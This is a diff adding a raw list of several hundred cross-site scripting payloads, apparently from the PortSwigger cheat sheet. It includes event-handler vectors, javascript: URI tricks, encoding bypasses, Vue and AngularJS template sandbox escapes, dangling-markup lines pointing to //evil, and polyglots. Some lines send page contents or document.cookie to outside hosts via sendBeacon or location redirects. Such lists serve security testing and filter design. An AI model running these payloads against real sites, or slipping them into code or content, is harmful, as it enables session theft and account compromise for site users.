@@ -1,0 +1,554 @@
+<xss onafterscriptexecute=alert(1)><script>1</script>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="print()"></xss>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
+<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>
+<body onbeforeprint=console.log(1)>
+<xss onbeforescriptexecute=alert(1)><script>1</script>
+<body onbeforeunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee>
+<audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video controls><source src=validvideo.mp4 type=video/mp4><track default oncuechange=alert(1) src="data:text/vtt,WEBVTT FILE
+
+1
+00:00:00.000 --> 00:00:05.000 
+<b>XSS</b>
+"></video>
+<audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
+<svg><animate onend=alert(1) attributeName=x dur=1s>
+<audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio src/onerror=alert(1)>
+<marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>
+<a id=x tabindex=1 onfocus=alert(1)></a>
+<a id=x tabindex=1 onfocusin=alert(1)></a>
+<body onhashchange="print()">
+<body onload=alert(1)>
+<audio onloadeddata=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio>
+<video onloadstart="alert(1)"><source></xss>
+<body onmessage=print()>
+<body onpageshow=alert(1)>
+<audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<body onpopstate=print()>
+<audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
+<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />
+<body onresize="print()">
+<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>
+<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xss>
+<marquee onstart=alert(1)>XSS</marquee>
+<audio controls onsuspend=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
+<audio controls autoplay ontimeupdate=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<details ontoggle=alert(1) open>test</details>
+<style>:target {color: red;}</style><xss id=x style="transition:color 10s" ontransitioncancel=print()></xss>
+<xss id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></xss>
+<style>:target {transform: rotate(180deg);}</style><xss id=x style="transition:transform 2s" ontransitionrun=print()></xss>
+<style>:target {color:red;}</style><xss id=x style="transition:color 1s" ontransitionstart=alert(1)></xss>
+<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>
+<body onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
+<style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationend="alert(1)"></xss>
+<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></xss>
+<style>@keyframes x{}</style><xss style="animation-name:x" onwebkitanimationstart="alert(1)"></xss>
+<style>:target {color:red;}</style><xss id=x style="transition:color 1s" onwebkittransitionend=alert(1)></xss>
+<body onafterprint=alert(1)>
+<input onauxclick=alert(1)>
+<a onbeforecopy="alert(1)" contenteditable>test</a>
+<a onbeforecut="alert(1)" contenteditable>test</a>
+<xss contenteditable onbeforeinput=alert(1)>test
+<button popovertarget=x>Click me</button><xss onbeforetoggle=alert(1) popover id=x>XSS</xss>
+<xss onblur=alert(1) id=x tabindex=1 style=display:block>test</xss><input value=clickme>
+<input onchange=alert(1) value=xss>
+<xss onclick="alert(1)" style=display:block>test</xss>
+<dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form>
+<xss oncontextmenu="alert(1)" style=display:block>test</xss>
+<xss oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<xss oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<xss ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</xss>
+<xss draggable="true" ondrag="alert(1)" style=display:block>test</xss>
+<xss draggable="true" ondragend="alert(1)" style=display:block>test</xss>
+<xss draggable="true" ondragenter="alert(1)" style=display:block>test</xss>
+<xss draggable="true" ondragexit="alert(1)" style=display:block>test</xss>
+<xss draggable="true" ondragleave="alert(1)" style=display:block>test</xss>
+<div draggable="true" contenteditable>drag me</div><xss ondragover=alert(1) contenteditable style=display:block>drop here</xss>
+<xss draggable="true" ondragstart="alert(1)" style=display:block>test</xss>
+<div draggable="true" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable style=display:block>drop here</xss>
+<xss onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</xss><input value=clickme>
+<form onformdata="alert(1)"><button>Click</button></form>
+<video onfullscreenchange=alert(1) src=validvideo.mp4 controls>
+<input oninput=alert(1) value=xss>
+<form><input oninvalid=alert(1) required><input type=submit>
+<xss onkeydown="alert(1)" contenteditable style=display:block>test</xss>
+<xss onkeypress="alert(1)" contenteditable style=display:block>test</xss>
+<xss onkeyup="alert(1)" contenteditable style=display:block>test</xss>
+<xss onmousedown="alert(1)" style=display:block>test</xss>
+<xss onmouseenter="alert(1)" style=display:block>test</xss>
+<xss onmouseleave="alert(1)" style=display:block>test</xss>
+<xss onmousemove="alert(1)" style=display:block>test</xss>
+<xss onmouseout="alert(1)" style=display:block>test</xss>
+<xss onmouseover="alert(1)" style=display:block>test</xss>
+<xss onmouseup="alert(1)" style=display:block>test</xss>
+<xss onmousewheel=alert(1) style=display:block>requires scrolling
+<video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls>
+<body onpagehide=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
+<a onpaste="alert(1)" contenteditable>test</a>
+<audio autoplay controls onpause=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<xss onpointerdown=alert(1) style=display:block>XSS</xss>
+<xss onpointerenter=alert(1) style=display:block>XSS</xss>
+<xss onpointerleave=alert(1) style=display:block>XSS</xss>
+<xss onpointermove=alert(1) style=display:block>XSS</xss>
+<xss onpointerout=alert(1) style=display:block>XSS</xss>
+<xss onpointerover=alert(1) style=display:block>XSS</xss>
+<xss onpointerrawupdate=alert(1) style=display:block>XSS</xss>
+<xss onpointerup=alert(1) style=display:block>XSS</xss>
+<audio controls autoplay onratechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<form onreset=alert(1)><input type=reset>
+<form><input type=search onsearch=alert(1) value="Hit return" autofocus>
+<audio autoplay controls onseeked=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay controls onseeking=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<input onselect=alert(1) value="XSS" autofocus>
+<body onselectionchange=alert(1)>select some text
+<body onselectstart=alert(1)>select some text
+<div contextmenu=xss><p>Right click<menu type=context id=xss onshow=alert(1)></menu></div>
+<form onsubmit=alert(1)><input type=submit>
+<button popovertarget=x>Click me</button><xss ontoggle=alert(1) popover id=x>XSS</xss>
+<body ontouchend=alert(1)> 
+<body ontouchmove=alert(1)> 
+<body ontouchstart=alert(1)> 
+<audio autoplay controls onvolumechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<body onwheel=alert(1)>
+<noembed><img title="</noembed><img src onerror=alert(1)>"></noembed>
+<noscript><img title="</noscript><img src onerror=alert(1)>"></noscript>
+<style><img title="</style><img src onerror=alert(1)>"></style>
+<script><img title="</script><img src onerror=alert(1)>"></script>
+<iframe><img title="</iframe><img src onerror=alert(1)>"></iframe>
+<xmp><img title="</xmp><img src onerror=alert(1)>"></xmp>
+<textarea><img title="</textarea><img src onerror=alert(1)>"></textarea>
+<noframes><img title="</noframes><img src onerror=alert(1)>"></noframes>
+<title><img title="</title><img src onerror=alert(1)>"></title>
+<input type="file" id="fileInput" /><script>const fileInput = document.getElementById('fileInput');const dataTransfer = new DataTransfer();const file = new File(['Hello world!'], 'hello.txt', {type: 'text/plain'});dataTransfer.items.add(file);fileInput.files = dataTransfer.files</script>
+<script>onerror=alert;throw 1</script>
+<script>{onerror=alert}throw 1</script>
+<script>throw onerror=alert,1</script>
+<script>throw onerror=eval,'=alert\x281\x29'</script>
+<script>throw onerror=eval,'alert\x281\x29'</script>
+<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script>
+<script>throw onerror=eval,e=new Error,e.message='alert\x281\x29',e</script>
+<script>throw onerror=Uncaught=eval,e=new Error,e.message='/*'+location.hash,!!window.InstallTrigger?e:e.message</script>
+<script>throw{},onerror=Uncaught=eval,h=location.hash,e={lineNumber:1,columnNumber:1,fileName:0,message:h[2]+h[1]+h},!!window.InstallTrigger?e:e.message</script>
+<script>throw/x/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,!!window.InstallTrigger?e:e.message</script>
+<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>
+<script>'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}</script>
+<script>location='javascript:alert\x281\x29'</script>
+<script>location=name</script>
+<script>alert`1`</script>
+<script>new Function`X${document.location.hash.substr`1`}`</script>
+<script>Function`X${document.location.hash.substr`1`}```</script>
+<video><source onerror=location=/\02.rs/+document.cookie>
+<svg onload=alert(1) 
+<svg onload=alert(1)<!--
+<script>throw[onerror]=[alert],1</script>
+<script>var{a:onerror}={a:alert};throw 1</script>
+<script>var{haha:onerror=alert}=0;throw 1</script>
+<script>window.name='javascript:alert(1)';</script><svg onload=location=name>
+<script>window.name='javascript:alert(1)';function blah(){}
+blah(""+{a:location=name}+"")</script>
+<script>window.name='javascript:alert(1)';function blah(){}
+blah(""+new class b{toString=e=>location=name}+"")</script>
+<xss class=progress-bar-animated onanimationstart=alert(1)>
+<xss class="carousel slide" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class="carousel-item active"></xss><xss class=carousel-item></xss></xss></xss>
+<iframe src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<a href="javascript:alert(1)">XSS</a>
+<a href="JaVaScript:alert(1)">XSS</a>
+<a href=" 	javascript:alert(1)">XSS</a>
+<a href="javas	cript:alert(1)">XSS</a>
+<a href="javascript
+:alert(1)">XSS</a>
+<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">XSS</text></a>
+<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>
+<svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a>
+<svg><set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>
+<script src="data:text/javascript,alert(1)"></script>
+<svg><script href="data:text/javascript,alert(1)" />
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x"></use></svg>
+<script>import('data:text/javascript,alert(1)')</script>
+<base href="javascript:/a/-alert(1)///////"><a href=../lol/safari.html>test</a>
+<math><x href="javascript:alert(1)">blah
+<form><button formaction=javascript:alert(1)>XSS
+<form><input type=submit formaction=javascript:alert(1) value=XSS>
+<form action=javascript:alert(1)><input type=submit value=XSS>
+<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://portswigger.net?&semi;javascript:alert(1)&semi;0" /><a id=xss><text x=20 y=20>XSS</text></a>
+<a href="javascript://%0aalert(1)">XSS</a>
+<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x" /></svg>
+<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
+<svg><animate xlink:href="#x" attributeName="href" values="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" /><use id=x />
+<embed code=https://portswigger-labs.net width=500 height=500 type=text/html>
+<object width=500 height=500 type=text/html><param name=url value=https://portswigger-labs.net>
+<object width=500 height=500 type=text/html><param name=code value=https://portswigger-labs.net>
+<object width=500 height=500 type=text/html><param name=movie value=https://portswigger-labs.net>
+<object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net>
+<script>location.protocol='javascript'</script>
+<a href="%0aalert(1)" onclick="protocol='javascript'">test</a>
+<script>navigation.navigate('javascript:alert(1)')</script>
+<iframe srcdoc="<img src=1 onerror=alert(1)>"></iframe>
+<iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"></iframe>
+<form action="javascript:alert(1)"><input type=submit id=x></form><label for=x>XSS</label>
+<input type="hidden" accesskey="X" onclick="alert(1)"> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)
+<link rel="canonical" accesskey="X" onclick="alert(1)" /> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)
+<a href=# download="filename.html">Test</a>
+<img referrerpolicy="no-referrer" src="//portswigger-labs.net">
+<a href=# onclick="window.open('http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//','alert(1)')">XSS</a>
+<iframe name="alert(1)" src="https://portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"></iframe>
+<base target="alert(1)"><a href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in base tag</a>
+<a target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in a tag</a>
+<img src="validimage.png" width="10" height="10" usemap="#xss"><map name="xss"><area shape="rect" coords="0,0,82,126" target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"></map>
+<form action="http://subdomain1.portswigger-labs.net/xss/xss.php" target="alert(1)"><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" value="XSS via target in a form"></form>
+<form><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type submit"></form>
+<form><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input name=1 type="image" src="validimage.png" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type image"></form>
+<meta http-equiv="refresh" content="0; url=//portswigger-labs.net">
+<meta charset="UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-
++/v8
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
++/v9
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
++/v+
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
++/v/
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+<iframe sandbox src="//portswigger-labs.net"></iframe>
+<meta name="referrer" content="no-referrer">
+%C0%BCscript>alert(1)</script>
+%E0%80%BCscript>alert(1)</script>
+%F0%80%80%BCscript>alert(1)</script>
+%F8%80%80%80%BCscript>alert(1)</script>
+%FC%80%80%80%80%BCscript>alert(1)</script>
+<script>\u0061lert(1)</script>
+<script>\u{61}lert(1)</script>
+<script>\u{0000000061}lert(1)</script>
+<script>eval('\x61lert(1)')</script>
+<script>eval('\141lert(1)')</script>
+<script>eval('alert(\061)')</script>
+<script>eval('alert(\61)')</script>
+<a href="&#106;avascript:alert(1)">XSS</a><a href="&#106avascript:alert(1)">XSS</a>
+<svg><script>&#97;lert(1)</script></svg>
+<svg><script>&#x61;lert(1)</script></svg>
+<svg><script>alert&NewLine;(1)</script></svg>
+<svg><script>x="&quot;,alert(1)//";</script></svg>
+<a href="&#0000106avascript:alert(1)">XSS</a>
+<a href="&#x6a;avascript:alert(1)">XSS</a>
+<a href="j&#x61vascript:alert(1)">XSS</a>
+<a href="&#x6a
+avascript:alert(1)">XSS</a>
+<a href="&#x6a avascript:alert(1)">XSS</a>
+<a href="&#x0000006a;avascript:alert(1)">XSS</a>
+<a href="&#X6A;avascript:alert(1)">XSS</a>
+<a href="javascript&colon;alert(1)">XSS</a>
+<a href="java&Tab;script:alert(1)">XSS</a>
+<a href="java&NewLine;script:alert(1)">XSS</a>
+<a href="javascript&colon;alert&lpar;1&rpar;">XSS</a>
+<a href="javascript:x='%27-alert(1)-%27';">XSS</a>
+<a href="javascript:x='&percnt;27-alert(1)-%27';">XSS</a>
+<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>
+<script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script>
+<script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script>
+<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>
+<iframe src="javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'"></iframe>
+<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>
+<img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>
+{{constructor.constructor('alert(1)')()}}
+<div v-html="''.constructor.constructor('alert(1)')()">a</div>
+<x v-html=_c.constructor('alert(1)')()>
+<x v-if=_c.constructor('alert(1)')()>
+{{_c.constructor('alert(1)')()}}
+{{_v.constructor('alert(1)')()}}
+{{_s.constructor('alert(1)')()}}
+<p v-show="_c.constructor`alert(1)`()">
+<x v-on:click='_b.constructor`alert(1)`()'>click</x>
+<x v-bind:a='_b.constructor`alert(1)`()'>
+<x @[_b.constructor`alert(1)`()]>
+<x :[_b.constructor`alert(1)`()]>
+<p v-=_c.constructor`alert(1)`()>
+<x #[_c.constructor`alert(1)`()]>
+<p :=_c.constructor`alert(1)`()>
+{{_c.constructor('alert(1)')()}}
+{{_b.constructor`alert(1)`()}}
+<x v-bind:is="'script'" src="//14.rs" />
+<x is=script src=//⑭.₨>
+<x @click='_b.constructor`alert(1)`()'>click</x>
+<x @[_b.constructor`alert(1)`()]>
+<x :[_b.constructor`alert(1)`()]>
+<x #[_c.constructor`alert(1)`()]>
+<x title"="&lt;iframe&Tab;onload&Tab;=alert(1)&gt;">
+<x title"="&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;">
+<xyz<img/src onerror=alert(1)>>
+<svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=setTimeout(/alert(1)/.source)&gt;</noscript></b></svg>
+<a @['c\lic\u{6b}']="_c.constructor('alert(1)')()">test</a>
+{{$el.ownerDocument.defaultView.alert(1)}}
+{{$el.innerHTML='\u003cimg src onerror=alert(1)\u003e'}}
+<img src @error=e=$event.path.pop().alert(1)>
+<img src @error=e=$event.composedPath().pop().alert(1)>
+<img src @error=this.alert(1)>
+<svg@load=this.alert(1)>
+<p slot-scope="){}}])+this.constructor.constructor('alert(1)')()})};//">
+{{_openBlock.constructor('alert(1)')()}}
+{{_createBlock.constructor('alert(1)')()}}
+{{_toDisplayString.constructor('alert(1)')()}}
+{{_createVNode.constructor('alert(1)')()}}
+<p v-show=_createBlock.constructor`alert(1)`()>
+<x @[_openBlock.constructor`alert(1)`()]>
+<x @[_capitalize.constructor`alert(1)`()]>
+<x @click=_withCtx.constructor`alert(1)`()>click</x>
+<x @click=$event.view.alert(1)>click</x>
+{{_Vue.h.constructor`alert(1)`()}}
+{{$emit.constructor`alert(1)`()}}
+<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script>
+<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script>
+<component is=script text=alert(1)>
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
+{{{}.")));alert(1)//"}}
+{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
+{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
+{{{}.")));alert(1)//"}}
+{{{}.")));alert(1)//"}}
+{{!ready && (ready = true) && (
+!call
+? $$watchers[0].get(toString.constructor.prototype)
+: (a = apply) &&
+(apply = constructor) &&
+(valueOf = call) &&
+(''+''.toString(
+'F = Function.prototype;' +
+'F.apply = F.a;' +
+'delete F.a;' +
+'delete F.valueOf;' +
+'alert(1);'
+)));}}
+{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}
+{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
+{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}
+{{
+c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
+c.$apply=$apply;c.$eval=b;op=$root.$$phase;
+$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
+C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
+B=C(b,c,b);$evalAsync("
+astNode=pop();astNode.type='UnaryExpression';
+astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
+astNode.argument={type:'Identifier',name:'foo'};
+");
+m1=B($$asyncQueue.pop().expression,null,$root);
+m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
+$eval('a(b.c)');[].push.apply=a;
+}}
+{{c=''.sub.call;b=''.sub.bind;c.$apply=$apply;c.$eval=b;$root.$$phase=null;$root.$digest=$on; C=c.$apply(c);B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='alert(1)';astNode.argument={type:'Identifier'};");m1=$$asyncQueue.pop().expression;m2=B(C,null,m1);[].push.apply=m2;$eval('B(b)');}}
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+constructor.constructor('alert(1)')()
+a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()
+toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)
+{}[['__proto__']]['x']=constructor.getOwnPropertyDescriptor;g={}[['__proto__']]['x'];{}[['__proto__']]['y']=g(''.sub[['__proto__']],'constructor');{}[['__proto__']]['z']=constructor.defineProperty;d={}[['__proto__']]['z'];d(''.sub[['__proto__']],'constructor',{value:false});{}[['__proto__']]['y'].value('alert(1)')()
+{}.")));alert(1)//";
+'a'.constructor.prototype.charAt=[].join;[1]|orderBy:'x=1} } };alert(1)//';
+{y:''.constructor.prototype}.y.charAt=[].join;[1]|orderBy:'x=alert(1)'
+constructor.constructor('alert(1)')()
+toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
+<input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">
+<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>
+<input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">
+<div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div>
+<input ng-cut=$event.composedPath()|orderBy:'(y=alert)(1)'>
+<body background="//evil?
+<table background="//evil?
+<table><thead background="//evil?
+<table><tbody background="//evil?
+<table><tfoot background="//evil?
+<table><td background="//evil?
+<table><th background="//evil?
+<link rel=stylesheet href="//evil?
+<link rel=icon href="//evil?
+<meta http-equiv="refresh" content="0; http://evil?
+<img src="//evil?
+<image src="//evil?
+<video><track default src="//evil?
+<video><source src="//evil?
+<audio><source src="//evil?
+<input type=image src="//evil?
+<form><button style="width:100%;height:100%" type=submit formaction="//evil?
+<form><input type=submit value="XSS" style="width:100%;height:100%" type=submit formaction="//evil?
+<button form=x style="width:100%;height:100%;"><form id=x action="//evil?
+<object data="//evil?
+<iframe src="//evil?
+<embed src="//evil?
+<form><button formaction=//evil>XSS</button><textarea name=x>
+<button form=x>XSS</button><form id=x action=//evil target='
+<a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target="
+<form><input type=submit value="Click me" formaction=http://subdomain1.portswigger-labs.net/dangling_markup/name.html formtarget="
+<a href=abc style="width:100%;height:100%;position:absolute;font-size:1000px;">xss<base href="//evil/
+<embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
+<iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
+<object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
+<frameset><frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
+<input type=hidden type=image src="//evil?
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \"
+ onmouseover=/*&lt;svg/*/onload=alert()//>
+javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/"/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//'>
+';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//
+';self['ale'+'rt'](self['doc'+'ument']['dom'+'ain']);//
+';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);//
+';top['ale'+'rt'](top['doc'+'ument']['dom'+'ain']);//
+';parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain']);//
+';frames['ale'+'rt'](frames['doc'+'ument']['dom'+'ain']);//
+';globalThis['ale'+'rt'](globalThis['doc'+'ument']['dom'+'ain']);//
+';window[/*foo*/'alert'/*bar*/](window[/*foo*/'document'/*bar*/]['domain']);//
+';self[/*foo*/'alert'/*bar*/](self[/*foo*/'document'/*bar*/]['domain']);//
+';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain']);//
+';top[/*foo*/'alert'/*bar*/](top[/*foo*/'document'/*bar*/]['domain']);//
+';parent[/*foo*/'alert'/*bar*/](parent[/*foo*/'document'/*bar*/]['domain']);//
+';frames[/*foo*/'alert'/*bar*/](frames[/*foo*/'document'/*bar*/]['domain']);//
+';globalThis[/*foo*/'alert'/*bar*/](globalThis[/*foo*/'document'/*bar*/]['domain']);//
+';window['\x61\x6c\x65\x72\x74'](window['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+';self['\x61\x6c\x65\x72\x74'](self['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+';this['\x61\x6c\x65\x72\x74'](this['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+';top['\x61\x6c\x65\x72\x74'](top['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+';parent['\x61\x6c\x65\x72\x74'](parent['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
